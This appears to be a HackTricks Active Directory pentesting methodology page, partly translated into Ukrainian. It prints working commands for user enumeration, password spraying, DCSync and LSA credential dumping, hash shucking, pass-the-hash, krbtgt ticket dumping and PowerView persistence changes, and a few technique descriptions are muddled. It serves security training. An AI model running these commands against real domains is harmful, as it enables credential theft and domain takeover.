# Методологія Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Загальний огляд

**Active Directory** слугує фундаментальною технологією, яка дозволяє **network administrators** ефективно створювати та управляти **domains**, **users** і **objects** у мережі. Вона спроєктована для масштабування, полегшуючи організацію великої кількості користувачів у керовані **groups** і **subgroups**, а також контроль **access rights** на різних рівнях.

Структура **Active Directory** складається з трьох основних шарів: **domains**, **trees** і **forests**. **Domain** охоплює набір об'єктів, таких як **users** або **devices**, які ділять спільну базу даних. **Trees** — це групи доменів, пов'язані спільною структурою, а **forest** представляє колекцію кількох дерев, з'єднаних через **trust relationships**, формуючи верхній рівень організаційної структури. На кожному з цих рівнів можна визначати специфічні **access** та **communication rights**.

Ключові поняття в **Active Directory** включають:

1. **Directory** – містить всю інформацію про об'єкти Active Directory.
2. **Object** – позначає сутності в каталозі, включно з **users**, **groups** або **shared folders**.
3. **Domain** – слугує контейнером для об'єктів каталогу; у **forest** може співіснувати кілька доменів, кожен із власною колекцією об'єктів.
4. **Tree** – група доменів, які ділять спільний root domain.
5. **Forest** – верхівка організаційної структури в Active Directory, що складається з кількох trees із **trust relationships** між ними.

**Active Directory Domain Services (AD DS)** охоплює набір сервісів, критично важливих для централізованого управління й комунікації в мережі. Ці сервіси включають:

1. **Domain Services** – централізує зберігання даних і керує взаємодіями між **users** та **domains**, включно з **authentication** та **search** функціями.
2. **Certificate Services** – відповідає за створення, розповсюдження та управління захищеними **digital certificates**.
3. **Lightweight Directory Services** – підтримує додатки, що використовують каталог, через **LDAP protocol**.
4. **Directory Federation Services** – забезпечує **single-sign-on** для автентифікації користувачів у кількох веб-додатках за одну сесію.
5. **Rights Management** – допомагає захищати авторські матеріали, контролюючи їхнє розповсюдження та використання.
6. **DNS Service** – критично важливий для розв'язання **domain names**.

Для детальнішого пояснення див.: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Щоб навчитися **attack an AD**, потрібно дуже добре **understand** процес **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Шпаргалка

Ви можете зайти на [https://wadcoms.github.io/](https://wadcoms.github.io) щоб швидко переглянути команди, які можна виконати для перечислення/експлуатації AD.

> [!WARNING]
> Kerberos communication **requires a full qualified name (FQDN)** для виконання дій. Якщо ви намагаєтесь підключитися до машини за IP-адресою, **буде використано NTLM, а не Kerberos**.

## Recon Active Directory (без облікових даних/сесій)

Якщо у вас є доступ до середовища AD, але немає облікових даних/сесій, ви можете:

- **Pentest the network:**
- Скануйте мережу, знаходьте хости та відкриті порти і намагайтеся **exploit vulnerabilities** або **extract credentials** з них (наприклад, [printers could be very interesting targets](ad-information-in-printers.md)).
- Перерахування DNS може дати інформацію про ключеві сервери в домені: web, printers, shares, vpn, media тощо.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Перегляньте загальну [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) щоб дізнатися більше про те, як це робити.
- **Check for null and Guest access on smb services** (це не працюватиме на сучасних версіях Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Детальніший гайд з перечислення SMB сервера можна знайти тут:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Детальніший гайд з перечислення LDAP можна знайти тут (зверніть **особливу увагу на anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Збирайте облікові дані, **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Доступ до хоста шляхом [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Збирайте облікові дані, **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Витягуйте usernames/імена з внутрішніх документів, соціальних мереж, сервісів (головним чином web) в межах домену, а також з публічно доступних джерел.
- Якщо ви знайдете повні імена працівників компанії, можна спробувати різні конвенції імен користувачів AD (**read this**). Найпоширеніші конвенції: _NameSurname_, _Name.Surname_, _NamSur_ (3 літери від кожного), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Інструменти:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Перерахування користувачів

- **Anonymous SMB/LDAP enum:** Перегляньте сторінки [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) та [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Коли запитується **invalid username**, сервер відповість кодом помилки Kerberos _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, що дозволяє визначити, що ім'я користувача недійсне. **Valid usernames** спричинять або **TGT in a AS-REP** відповідь, або помилку _KRB5KDC_ERR_PREAUTH_REQUIRED_, вказуючи, що користувач повинен виконати pre-authentication.
- **No Authentication against MS-NRPC**: Використання auth-level = 1 (No authentication) проти MS-NRPC (Netlogon) інтерфейсу на domain controllers. Метод викликає функцію `DsrGetDcNameEx2` після прив'язки до MS-NRPC інтерфейсу, щоб перевірити, чи існує користувач або комп'ютер без жодних облікових даних. Інструмент [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) реалізує цей тип перечислення. Дослідження можна знайти [тут](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Якщо ви знайшли один із таких серверів у мережі, ви також можете виконати **user enumeration** проти нього. Наприклад, ви можете використати інструмент [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Ви можете знайти списки імен користувачів в [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  і в цьому ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Проте, ви повинні мати **імена людей, що працюють у компанії** з етапу recon, який ви мали виконати раніше. Маючи ім'я та прізвище, ви можете використати скрипт [**namemash.py**](https://gist.github.com/superkojiman/11076951) для генерації потенційно дійсних імен користувачів.

### Знаючи одне або кілька імен користувачів

Отже, ви вже знаєте дійсне ім'я користувача, але не маєте паролів... Тоді спробуйте:

- [**ASREPRoast**](asreproast.md): Якщо користувач **не має** атрибута _DONT_REQ_PREAUTH_ ви можете **запитати AS_REP message** для цього користувача, який міститиме дані, зашифровані похідним від пароля користувача.
- [**Password Spraying**](password-spraying.md): Спробуйте найпоширеніші **поширені паролі** для кожного з виявлених користувачів — можливо, хтось використовує слабкий пароль (майте на увазі політику паролів!).
- Зверніть увагу, що ви також можете **spray OWA servers**, щоб спробувати отримати доступ до поштових серверів користувачів.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ви можете змогти **отримати** деякі challenge **hashes** для їх зламу, виконуючи **poisoning** деяких протоколів **мережі**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Якщо вам вдалося провести енумерацію Active Directory, у вас буде **більше email-адрес і краще розуміння мережі**. Можливо, ви зможете примусово виконати NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) для отримання доступу до AD env.

### NetExec workspace-driven recon & relay posture checks

- Використовуйте **`nxcdb` workspaces** для збереження стану AD recon по кожному engagement: `workspace create <name>` створює per-protocol SQLite DBs у `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Перемикайте перегляди за допомогою `proto smb|mssql|winrm` і виводьте зібрані секрети командою `creds`. Після завершення вручну видаліть чутливі дані: `rm -rf ~/.nxc/workspaces/<name>`.
- Швидке виявлення підмережі за допомогою **`netexec smb <cidr>`** показує **domain**, **OS build**, **SMB signing requirements**, та **Null Auth**. Хости, що показують `(signing:False)`, є **relay-prone**, тоді як DC часто вимагають підписування.
- Генеруйте **hostnames in /etc/hosts** безпосередньо з виводу NetExec, щоб полегшити націлювання:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Якщо **SMB relay to the DC is blocked** через signing, все одно перевіряйте стан **LDAP**: `netexec ldap <dc>` підкреслює `(signing:None)` / слабке channel binding. DC з вимогою SMB signing, але з вимкненим LDAP signing залишається придатною ціллю для **relay-to-LDAP** зловживань, таких як **SPN-less RBCD**.

### Client-side printer credential leaks → масова перевірка облікових даних домену

- Printer/web UIs іноді **embed masked admin passwords in HTML**. Перегляд source/devtools може виявити cleartext (наприклад, `<input value="<password>">`), що дозволяє Basic-auth доступ до scan/print repositories.
- Retrieved print jobs можуть містити **plaintext onboarding docs** з per-user passwords. Тримайте відповідність пар під час тестування:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Якщо вам вдалося просканувати Active Directory, у вас з'явиться **більше email-адрес і краще розуміння мережі**. Ви можете змусити NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Тепер, коли у вас є базові credentials, слід перевірити, чи можете ви **знайти** які-небудь **цікаві файли, що шаряться всередині AD**. Ви можете робити це вручну, але це дуже нудна повторювана робота (особливо якщо знайдете сотні документів, які треба перевірити).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Якщо ви можете **доступитися до інших ПК або shares**, ви можете **розмістити файли** (наприклад SCF file), які, якщо їх відкриють, спричинять **NTLM authentication проти вас**, щоб ви могли **вкрасти** **NTLM challenge** для його крекінгу:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ця вразливість дозволяла будь-якому автентифікованому користувачеві **компрометувати домен-контролер**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Для наведених технік звичайного domain user недостатньо — потрібні спеціальні привілеї/credentials для виконання цих атак.**

### Hash extraction

Сподіваюсь, вам вдалося **компрометувати якийсь local admin** акаунт, використовуючи [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) включно з relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Тоді настав час зняти всі хеші з пам'яті і локально.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
Потрібно використати якийсь **tool**, який виконає **NTLM authentication із** цим **hash**, **або** можна створити новий **sessionlogon** і **інжектнути** цей **hash** у **LSASS**, тож коли відбуватиметься будь-яка **NTLM authentication**, використовуватиметься саме цей **hash.** Останній варіант — те, що робить mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ця атака спрямована на **використання NTLM хешу користувача для запиту Kerberos tickets**, як альтернатива поширеному Pass The Hash через NTLM протокол. Тому це може бути особливо **корисним у мережах, де NTLM протокол відключено** і дозволено лише **Kerberos як протокол автентифікації**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

У методі атаки **Pass The Ticket (PTT)** зловмисники **крадуть authentication ticket користувача** замість його пароля або значень хешу. Цей вкрадений ticket потім використовується для **імітації користувача**, отримуючи несанкціонований доступ до ресурсів і сервісів у мережі.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Якщо у вас є **hash** або **password** від **local administrator**, спробуйте **увійти локально** на інших **ПК** з його допомогою.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Зверніть увагу, що це досить **noisy**, і **LAPS** **would mitigate** це.

### MSSQL Abuse & Trusted Links

Якщо користувач має привілеї для **access MSSQL instances**, він може використати це, щоб **execute commands** на MSSQL хості (якщо процес працює під SA), **steal** NetNTLM **hash** або навіть виконати **relay** **attack**.\
Також, якщо одна MSSQL інстанція є trusted (database link) для іншої MSSQL інстанції, і користувач має привілеї над trusted database, він зможе **use the trust relationship to execute queries also in the other instance**. Ці довіри можна ланцюжити, і в якийсь момент користувач може знайти некоректно налаштовану базу даних, де зможе виконувати команди.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Сторонні рішення для інвентаризації та деплойменту часто відкривають потужні шляхи до credentials та code execution. Див.:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Якщо ви знайдете будь-який Computer object з атрибутом [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) і маєте domain привілеї на цьому комп'ютері, ви зможете дампити TGTs з пам'яті всіх користувачів, які заходять на цей комп'ютер.\
Тому, якщо **Domain Admin logins onto the computer**, ви зможете дампити його TGT і імітувати його за допомогою [Pass the Ticket](pass-the-ticket.md).\
Завдяки constrained delegation ви навіть можете **automatically compromise a Print Server** (сподіваюсь, це буде DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Якщо користувачу або computer дозволено "Constrained Delegation", він зможе **impersonate any user to access some services in a computer**.\
Тоді, якщо ви **compromise the hash** цього користувача/computer, ви зможете **impersonate any user** (навіть domain admins) для доступу до певних сервісів.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Наявність **WRITE** привілею на Active Directory object віддаленого комп'ютера дозволяє досягти code execution з **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Скомпрометований користувач може мати деякі **interesting privileges over some domain objects**, що може дозволити вам пізніше **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Виявлення **Spool service listening** у домені може бути **abused** для **acquire new credentials** та **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Якщо **other users** **access** the **compromised** machine, можливо **gather credentials from memory** і навіть **inject beacons in their processes** щоб імітувати їх.\
Зазвичай користувачі підключаються через RDP, тому тут показано, як виконати кілька атак над сторонніми RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** забезпечує систему для управління **local Administrator password** на комп'ютерах, приєднаних до домену, гарантуючи, що пароль **randomized**, унікальний і часто **changed**. Ці паролі зберігаються в Active Directory, а доступ контролюється через ACLs лише для авторизованих користувачів. Маючи достатні дозволи для доступу до цих паролів, можливо pivot-ити на інші комп'ютери.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** з скомпрометованого машини може бути шляхом для escalation privileges всередині середовища:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Якщо сконфігуровані **vulnerable templates**, їх можна зловживати для escalation privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Коли ви отримаєте **Domain Admin** або ще краще **Enterprise Admin** привілеї, ви можете **dump** **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Деякі з технік, описаних вище, можна використати для persistence.\
Наприклад, ви можете:

- Зробити користувачів вразливими до [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Зробити користувачів вразливими до [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Надати користувачу привілеї для [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Атака **Silver Ticket** створює легітимний Ticket Granting Service (TGS) ticket для певного сервісу, використовуючи **NTLM hash** (наприклад, **hash of the PC account**). Цим методом отримують доступ до привілеїв сервісу.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Атака **Golden Ticket** полягає в тому, що нападник отримує доступ до **NTLM hash of the krbtgt account** в Active Directory. Цей акаунт особливий тим, що використовується для підпису всіх **Ticket Granting Tickets (TGTs)**, які є критичними для аутентифікації в AD мережі.

Після отримання цього hash, нападник може створювати **TGTs** для будь-якого акаунту за бажанням (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Це як golden tickets, але підроблені таким чином, щоб **bypass common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** — дуже хороший спосіб зберегти persistence в акаунті користувача (навіть якщо він змінить пароль):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Використання certificates також дозволяє зберігати persistence з високими привілеями всередині домену:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Об'єкт **AdminSDHolder** в Active Directory забезпечує безпеку **privileged groups** (як-от Domain Admins та Enterprise Admins), застосовуючи стандартний **Access Control List (ACL)** до цих груп, щоб запобігти несанкціонованим змінам. Однак ця функція може бути використана зловмисниками; якщо нападник змінить ACL AdminSDHolder, надавши повний доступ звичайному користувачу, цей користувач отримає широкий контроль над усіма привілейованими групами. Цей механізм, призначений для захисту, може призвести до небажаного доступу, якщо за ним не стежити.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

У кожному **Domain Controller (DC)** існує локальний адміністратор. Отримавши admin права на такий сервер, хеш локального Administrator можна витягти за допомогою **mimikatz**. Після цього необхідна зміна реєстру, щоб **enable the use of this password**, що дозволить віддалений доступ до локального Administrator акаунту.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Ви можете **give** певному **user** спеціальні привілеї над конкретними domain objects, які дозволять цьому користувачу **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** використовуються для **store** **permissions**, які має **object** над ресурсом. Якщо ви можете внести навіть **little change** в **security descriptor** об'єкта, ви можете отримати дуже цікаві привілеї над цим об'єктом без необхідності бути членом привілейованої групи.


